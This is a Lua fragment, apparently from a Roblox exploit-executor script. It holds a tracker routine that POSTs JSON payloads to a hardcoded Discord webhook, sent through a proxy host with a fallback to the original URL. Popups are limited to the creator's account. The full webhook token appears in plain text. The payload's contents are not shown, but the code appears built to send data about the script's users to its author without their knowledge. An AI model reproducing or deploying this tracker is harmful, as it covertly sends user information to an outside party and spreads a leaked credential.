local CREATOR_USER_ID = 9685785248
local ORIGINAL_URL = "https://discord.com/api/webhooks/1541722782310604820/L3kjYivqBHkOtU5HZJj7pNFJGyHkBHBaVZPg0AY-QBAJFf_SG3cu8TEcMaRjUuRTiyD1"
local WEBHOOK_URL = ORIGINAL_URL:gsub("https://discord.com", "https://webhook.lewisakura.moe")
local TRACKER_FILE = "TXR_Tracker_Data.json"

-- Sirf Owner (Ashu Papa) ki screen par popup dikhega
local function sendNotification(title, text)
    if lp.UserId == CREATOR_USER_ID then
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = title,
                Text = text,
                Duration = 4
            })
        end)
    end
end

local function postToWebhook(payloadTable)
    local jsonBody = HttpService:JSONEncode(payloadTable)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
    
    if requestFunc then
        local success, res = pcall(function()
            return requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonBody
            })
        end)

        if not (success and res and (res.StatusCode == 200 or res.StatusCode == 204)) then
            pcall(function()
                requestFunc({
                    Url = ORIGINAL_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonBody
                })
            end)
        end
    end
end

